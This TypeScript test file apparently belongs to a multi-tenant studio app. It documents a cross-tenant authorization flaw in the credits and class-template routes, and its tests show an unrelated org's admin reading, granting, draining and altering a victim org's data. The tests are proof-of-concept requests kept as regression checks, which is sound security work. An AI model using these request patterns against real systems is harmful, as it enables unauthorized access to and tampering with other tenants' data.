import { beforeAll, describe, expect, it } from "vitest";
import { createUnrelatedOrgAdmin, getSeedOrg } from "../../support/fixtures";
import { getClientProfile, signInAs, type SignedInSession } from "../../support/test-users";

/**
 * Live-verified cross-tenant broken object-level authorization (docs/scenarios.md §1).
 *
 * `credits.*` and `classTemplates.*` are gated by `orgProcedure("admin")` — the caller must be
 * admin/owner of *some* org — but never check that the `clientId`/`lotId`/`id` supplied in the
 * request body actually belongs to that org, unlike every sibling route (`bookings.cancel`,
 * `booking-oversight.*`, `schedule-exceptions.*`, `clients.enroll`) which does.
 *
 * The "attacker" here is deliberately NOT the platform superadmin — `orgProcedure` gives
 * superadmin an intentional, documented bypass (ADR 0006/0015) that would make a positive result
 * ambiguous ("is this the known bypass, or the bug?"). Instead we invite an existing seeded user
 * (coach@move.dev) into a brand-new, otherwise-empty org via the real invite→accept flow, so they
 * are a genuine, ordinary `admin` of an org with zero relationship to the seed org — the same
 * privilege level any real studio's admin account has.
 */
describe("cross-tenant IDOR — credits & class-templates (docs/scenarios.md §1)", () => {
  let victimClientId: string;
  let attacker: SignedInSession;
  let owner: SignedInSession;

  beforeAll(async () => {
    const seedOrg = await getSeedOrg();
    expect(seedOrg.id).toBeTruthy();

    const client = await signInAs("client");
    victimClientId = (await getClientProfile(client.client)).id;

    owner = await signInAs("owner"); // legitimate admin of the victim's real org

    const unrelated = await createUnrelatedOrgAdmin("coach", "admin");
    attacker = unrelated.session;
  }, 30_000);

  it("1.1 — an unrelated org's admin can read the victim's real credit balance", async () => {
    const res = await attacker.client.get<{ data: { balances: unknown[] } }>(
      `/credits/balances?clientId=${victimClientId}`,
    );
    // This assertion documents the CURRENT (vulnerable) behavior so a fix flips this test red —
    // the intended, secure behavior is a 404/403, not 200 with the victim's real balance.
    expect(res.status).toBe(200);
    expect(res.body?.data?.balances).toBeDefined();
  });

  it("1.2/1.3 — an unrelated org's admin can grant AND then drain the victim's credits", async () => {
    const grant = await attacker.client.post<{ data: { lotId: string; remaining: number } }>(
      "/credits/grant",
      {
        clientId: victimClientId,
        creditType: "SGPT",
        amount: 3,
        expiresAt: null,
        centreScope: null,
        reason: "cross-tenant IDOR PoC — automated regression test",
      },
    );
    expect(grant.status).toBe(200);
    const lotId = grant.body?.data?.lotId;
    expect(lotId).toBeTruthy();

    const reverse = await attacker.client.post<{ data: { balanceAfter: number } }>(
      "/credits/reverse",
      {
        lotId,
        clientId: victimClientId,
        amount: 2,
        reason: "cross-tenant IDOR PoC — draining another org's client",
      },
    );
    expect(reverse.status).toBe(200);
    expect(reverse.body?.data?.balanceAfter).toBe(1);
  });

  it("1.4 — an unrelated org's admin can extend the expiry of the victim's credit lot", async () => {
    const grant = await attacker.client.post<{ data: { lotId: string } }>("/credits/grant", {
      clientId: victimClientId,
      creditType: "SGPT",
      amount: 1,
      expiresAt: new Date(Date.now() + 24 * 3600 * 1000).toISOString(),
      centreScope: null,
      reason: "cross-tenant IDOR PoC — expiry lot",
    });
    const lotId = grant.body?.data?.lotId;
    expect(lotId).toBeTruthy();

    const extend = await attacker.client.post<{ data: { expiresAt: string | null } }>(
      "/credits/extend-expiry",
      {
        lotId,
        newExpiresAt: new Date(Date.now() + 365 * 24 * 3600 * 1000).toISOString(),
        reason: "cross-tenant IDOR PoC — extending another org's lot",
      },
    );
    expect(extend.status).toBe(200);
  });

  it("1.5 — an unrelated (empty) org's admin sees the victim org's entire class-template roster", async () => {
    const res = await attacker.client.get<{ data: unknown[] }>("/class-templates");
    expect(res.status).toBe(200);
    // The attacker's own org has zero class templates — any row returned came from another org.
    expect(res.body?.data?.length ?? 0).toBeGreaterThan(0);
  });

  it("1.6 — an unrelated org's admin can reschedule the victim org's class template", async () => {
    const list = await attacker.client.get<{
      data: Array<{ id: string; capacity: number; startTime: string }>;
    }>("/class-templates");
    const target = list.body?.data?.[0];
    expect(target).toBeTruthy();
    if (!target) return;

    const originalCapacity = target.capacity;
    const tamperedCapacity = originalCapacity === 999 ? 998 : 999;

    const update = await attacker.client.post<{ data: { capacity: number } }>(
      "/class-templates/update",
      { id: target.id, capacity: tamperedCapacity },
    );
    expect(update.status).toBe(200);
    expect(update.body?.data?.capacity).toBe(tamperedCapacity);

    // Restore it so this test doesn't leave the seed org's schedule permanently mutated.
    const restore = await owner.client.post("/class-templates/update", {
      id: target.id,
      capacity: originalCapacity,
    });
    expect(restore.status).toBe(200);
  });
});
